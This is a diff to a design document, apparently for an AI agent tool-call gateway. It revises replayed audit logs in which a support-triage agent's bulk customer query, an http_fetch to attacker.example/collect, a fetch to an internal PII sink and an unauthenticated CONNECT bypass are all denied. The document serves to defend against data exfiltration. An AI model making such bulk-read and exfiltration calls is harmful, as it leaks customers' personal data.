@@ -307,15 +307,15 @@ The second destination is **on the egress allowlist**. A naive allowlist-only br
 
 ```
 task 4711  purpose=support-triage  agent=triage-bot
-  ✓ read_document(ticket-4711)             allow  allow
-  ✓ read_document(kb/refund-policy)        allow  allow
-  ✓ query_customers(rows≈1)                allow  allow
+  ✓ read_document(ticket-4711)             allow
+  ✓ read_document(kb/refund-policy)        allow
+  ✓ query_customers(rows≈1)                allow
       ⛔ TAINT: task now holds data_class=pii
   ✗ query_customers(rows≈10312)            DENY   rows.bounded
   ✗ http_fetch(attacker.example/collect)   DENY   egress.allowlist
   ✗ http_fetch(docstore.internal/feedback) DENY   egress.pii_sink
-  ✓ send_email(customer:8812)              allow  allow
-  chain intact: 7 records, head sha256:de6d8b7d…
+  ✓ send_email(customer:8812)              allow
+  chain intact: 7 records, head sha256:…
 ```
 
 An allow carries the rule `allow`. `deny_reasons` is the source of truth and there was nothing in it; printing the name of a rule that did not fire would claim the log knows *why* a call was permitted, which it does not.
@@ -325,7 +325,7 @@ The proxy's own record is not in this replay, and that is correct rather than a 
 ```
 task -  purpose=-  agent=unauthenticated
   ✗ CONNECT(attacker.example)              DENY   unauthenticated
-  chain intact: 1 records, head sha256:2ef02da2…
+  chain intact: 1 records, head sha256:…
 ```
 
 `unauthenticated`, not `egress.allowlist`. That is the better line to have on the screen: the bypass attempt did not fail a destination check, it arrived with no authority whatsoever.
